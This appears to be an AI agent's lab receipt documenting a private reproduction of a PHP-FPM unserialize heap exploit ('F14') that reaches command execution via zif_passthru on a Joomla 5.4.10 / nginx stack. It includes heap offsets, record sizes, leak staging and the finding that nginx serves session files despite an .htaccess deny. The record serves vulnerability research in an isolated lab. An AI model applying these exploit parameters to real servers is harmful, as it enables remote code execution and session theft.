# Joomla 5.4.10 + nginx + PHP-FPM: file-session test and F14 `zif_passthru`

Receipt directory: `/tmp/opencode/research/joomla_fpm_20261022T021000Z`
Date: 2026-10-22 (local CEST)
Related Drupal receipt: `/tmp/opencode/research/drupal_fpm_20261022T013000Z/FINAL_RECEIPT.md`

## Verdict

The F14-style session-file leak and `zif_passthru` chain were reproduced on a private
Joomla 5.4.10 / nginx / PHP-FPM stack **after changing Joomla to the filesystem session
handler**, which is **not** Joomla 5.4.10's installed default. The final stage was
gdb-free: worker **178847** planted the stale unserialize state, served the upload-progress
trigger, created `MARKER_PASSTHRU_j2`, served a health request, and remained alive.

The Joomla default finding is a negative result for the premise "Joomla 5 file sessions
live under the web-served `tmp/` by default": Joomla 5.4.10 installs with
`session_handler = 'database'`, stores 716-byte session data in `jos_session`, and creates
**no** `sess_*` file in `tmp/`. The file-session result below is therefore a lab
configuration change, clearly separated from the default result.

## 1. Private stack

| Component | Value |
|---|---|
| Joomla | **5.4.10** full package, `/tmp/opencode/joomla5`; official zip SHA-1 `f990158af7c5ed0af92587f7c62991b9efc23f9a` |
| PHP-FPM | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`, PHP 8.5.10, md5 `4ee099823b75e16ea36f93c71d57bfd8` |
| FPM master | **174553**, config `conf/fpm.conf` |
| Normal pool / worker | `joomla` / **174554**, 512M, normal Joomla requests |
| Lab pool / worker | `joomla_lab` / **178847**, 2M, `unserialize_max_depth=20000`, native file sessions in `/tmp/opencode/joomla5/tmp` |
| nginx | private `127.0.0.1:28871`, config `conf/nginx.conf`, root `/tmp/opencode/joomla5` |
| MariaDB | `127.0.0.1:33318`, database `joomla`, prefix `jos_` |
| ASLR | `/proc/sys/kernel/randomize_va_space = 2` throughout |

Relevant `joomla_lab` pool settings (full file `conf/fpm.conf`):

```
pm = static
pm.max_children = 1
php_admin_value[memory_limit] = 2M
php_admin_value[unserialize_max_depth] = 20000
php_admin_value[session.save_handler] = files
php_admin_value[session.save_path] = /tmp/opencode/joomla5/tmp
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.gc_probability] = 0
```

The FPM master was started normally; no `setarch -R`, no `LD_PRELOAD`, and no gdb in the
final stage. The final stage used the same long-lived master, so worker 178847 inherited
the master's randomized heap base. Shared PIDs `4052217`, `4052937`, `4053032`, and
`4054145` were not touched.

## 2. Joomla default is database sessions (negative result)

The stock install was performed with Joomla's CLI installer. The preserved installed
configuration is `configuration.php.default_database`:

```
public $tmp_path = '/tmp/opencode/joomla5/tmp';
public $session_handler = 'database';
public $session_metadata = true;
```

Evidence:

- `GET /` with a fresh cookie jar returned HTTP 200 and set cookie
  `641f780239d7160b878a1acafb4f3c91=2baf7b2dccc9618ead14e6f77c790582`.
- `jos_session` contained `2baf7b2dccc9618ead14e6f77c790582` with
  `LENGTH(data)=716` and guest=1.
- No `/tmp/opencode/joomla5/tmp/sess_2baf7b2dccc9618ead14e6f77c790582` existed.
- At that point `tmp/` contained only `index.html`.
- The original package zip has exactly `tmp/` and `tmp/index.html`; it ships **no**
  `tmp/.htaccess` and no enabled root `.htaccess` (only `htaccess.txt`).

Therefore, with the installed default there is no session file for nginx to serve. nginx's
static handler would serve a `tmp/sess_*` file if one existed, but Joomla's database
handler does not create one. The file-service behavior is demonstrated only in the lab
filesystem configuration in Section 3.

## 3. Lab file-session configuration and `.htaccess` test

To test the requested file-session behavior, the installed default was preserved and
`configuration.php` was changed to:

```
public $session_handler = 'filesystem';
public $session_filesystem_path = '/tmp/opencode/joomla5/tmp';
```

The Joomla front page then created:

```
-rw------- 1 davide davide 716 ... /tmp/opencode/joomla5/tmp/sess_a789df811b23763cf8e3265add0db4e8
```

The corresponding `jos_session` row `a789df811b23763cf8e3265add0db4e8` has
`data_len=NULL` (Joomla metadata row); the actual session data is in the file. Fetching
the file through the same nginx server:

```
GET /tmp/sess_a789df811b23763cf8e3265add0db4e8
HTTP/1.1 200 OK
Content-Length: 716
SHA-1: 7195681a86bfec51ca7145c8653897cca74fea2b
```

A lab `tmp/.htaccess` was created with:

```
Require all denied
Deny from all
```

nginx still served both the deny file and the session file:

```
GET /tmp/.htaccess    -> HTTP 200, 88 bytes
GET /tmp/sess_a789... -> HTTP 200, 716 bytes, SHA-1 7195681a...
```

This is Apache-deny syntax, ignored by nginx. Caveat: the `.htaccess` was **created for
this test**; Joomla 5.4.10 does not ship it. The result is still a valid demonstration
that nginx does not honor an `.htaccess` deny file placed in this web-served `tmp/`.

## 4. F14 leak and `zif_passthru` on the Joomla file-session path

The same FPM binary and the same lab endpoints (`/exploit/sess.php`,
`/exploit/trigger.php`, `/exploit/health.php`) were used. The uploaded session files
were written to Joomla's configured `tmp/` and fetched through nginx.

### 4.1 Geometry

Measured on master **174553** with gdb calibration (plant and benign trigger only):

```
heap   = 0x7f06c6200040
P      = 0x7f06c6281000   (stale php_unserialize_data)
B0     = 0x7f06c6290000   (measured plant last_dtor)
X      = 0x7f06c626b000   (trigger data start)
S_dest = 0x7f06c6269040   (S zend_string allocation)
K_dest = 0x7f06c6284000   (S[8], served leak)
```

Deltas:

```
P      = K_dest - 0x3000
B0     = K_dest + 0xC000      <-- Joomla delta, not Drupal's +0xB000
X      = K_dest - 0x19000
S_dest = K_dest - 0x1AFC0
S      = K_dest + 0x18
P - X  = 0x16000
```

The Joomla `B0-K` delta is **0xC000**; the Drupal `B0-K=0xB000` must not be reused.
`P=K-0x3000` happens to match Drupal, but `X` and `S_dest` do not.

### 4.2 Record-size adaptation

With the Drupal 81,920-byte record, Joomla's `X` was `P-0x16000`: the 0x14000-byte
record ended at `P-0x2000`, so the fake `php_unserialize_data` at `P` was outside the
record and the first attempt did not leak. A benign 98,304-byte (`0x18000`) trigger
measured the **same** `X=0x7f06c626b000`, placing `P` at record offset `0x16000`. The
successful Joomla run therefore used:

```
total = 0x18000 (98,304 bytes)
used  = -0x1805
```

`used=-0x1805` makes the first `var_tmp_var` slot coincide with the S zend_string
allocation `S_dest`; the following J value at `S_dest+0x10` writes 4096 into the S
string length field. The leak file was served as:

```
GET /tmp/sess_tb1
HTTP 200, 102,666 bytes
SHA-1 d41c2665672a322950548b94df950573d172ad80
prefix: S|s:4096:"
K_dest at S data offset 8 = 0x7f06c6284000
```

This is the same F14 primitive as the Drupal run, with an application-specific record
size and `used_slots`; the served leak still supplies `K_dest`.

### 4.3 Final gdb-free trigger

The final record was 98,304 bytes: one session key of length 98,292, value
`i:10731636;`, no `|` inside the key. It placed:

- fake `php_unserialize_data` at `P`
- fake dtor at `D=P+0x88=0x7f06c6281088`
- fake `zend_execute_data` at `S=0x7f06c6284018`
- `F=S+0x200`; command
  `touch /tmp/opencode/research/joomla_fpm_20261022T021000Z/MARKER_PASSTHRU_j2;`

The final stage used no gdb. Its P/X values were the measured calibration values,
which are exactly the leak-derived formulas above; the second-decode pointer S came
from the served `K_dest` (`S=K_dest+0x18`). Results:

| Field | Result |
|---|---|
| Worker before final | **178847** (fresh after the leak worker crashed) |
| Plant | `POST /exploit/sess.php` HTTP **200**, `memory_limit=2M` OOM, worker alive |
| Trigger | `POST /exploit/trigger.php` HTTP **200**, body `trigger-ok\n` |
| Marker | `MARKER_PASSTHRU_j2`, size 0, mtime `2026-10-22 02:12:19.892975610 +0200` |
| Worker after trigger | **178847** (same PID) |
| Health | `POST /exploit/health.php` HTTP **200**, body `health-ok\n` |
| Worker after health | **178847** (same PID) |
| Survived | **true** |
| FPM log | no exit entry for 178847 after it started at 02:12:18 |

The leak worker (178035) died with `zend_mm_heap corrupted` and was replaced by 178847;
that is the expected first-stage crash, not the final worker. After the final trigger the
session file contains the 327-byte upload-progress array (`x|a:5:{...}`), but the marker
is the decisive proof that `zif_passthru` executed.

## 5. Caveats

1. **Joomla 5.4.10 default is DB sessions.** `session_handler='database'`; session data
   is in `jos_session` and no file exists in `tmp/`. The premise that Joomla 5 file
   sessions live under the web-served `tmp/` by default is false for this version.
2. **The file-session result is a lab configuration change.** `configuration.php` was
   changed to `session_handler='filesystem'` and
   `session_filesystem_path='/tmp/opencode/joomla5/tmp'`. The installed default is
   preserved in `configuration.php.default_database`; restore with
   `cp configuration.php.default_database configuration.php` if needed.
3. **No stock `tmp/.htaccess`.** The package ships only `tmp/index.html`; the deny file
   was created manually for the nginx test. nginx served both the deny file and the
   session file, proving it ignores `.htaccess`.
4. **The exploit endpoints are lab scripts in the Joomla docroot**, not Joomla's own
   front-end session code. The session storage path is Joomla's configured `tmp/`; the
   Joomla app's own file session (`sess_a789...`) was separately fetched HTTP 200.
5. **Record size is 0x18000, not Drupal's 81920.** Joomla's `P-X=0x16000` cannot fit in
   an 0x14000 record. `used=-0x1805`, `B0-K=0xC000`, `X-K=-0x19000`,
   `S_dest-K=-0x1AFC0`; do not reuse Drupal constants.
6. **P/B0 were gdb-calibrated; the final trigger was gdb-free.** The exact F14 startup
   OOM was not used; the working plant is script-level OOM followed by the
   upload-progress trigger. The save_path latch was not needed.
7. All activity was private; no shared PIDs were touched.

## 6. Evidence paths

- `arms/repeat_j2.json` - successful leak + final result
- `arms/final_verification.txt` (in the Drupal receipt arms directory; cross-checks this run)
- `arms/repeat_j2.leak.served.bin` - 102,666-byte served leak
- `arms/joomla_sess_fetch.bin`, `arms/joomla_sess_fetch.headers` - Joomla app session
  file fetched from `/tmp/sess_a789...`, HTTP 200, 716 bytes
- `arms/joomla_htaccess_fetch.bin`, `arms/joomla_htaccess_fetch.headers` - `.htaccess`
  served HTTP 200
- `arms/joomla_config_evidence.txt` - default vs lab configuration lines
- `arms/joomla_session_evidence.txt` - `jos_session` rows, `tmp/` listing, package
  `tmp/` contents
- `arms/default_home.html`, `arms/default_home.headers` - default DB-session request
- `arms/fs_home.html`, `arms/fs_home.headers` - filesystem-session request
- `arms/jcal_n18000.json` - benign 0x18000 geometry calibration
- `MARKER_PASSTHRU_j2`
- `conf/fpm.conf`, `conf/nginx.conf`, `lab_repeat_one.py`, `gdb/gb_measure.gdb`
- `log/fpm-error.log`, `log/nginx-access.log`, `log/nginx-error.log`
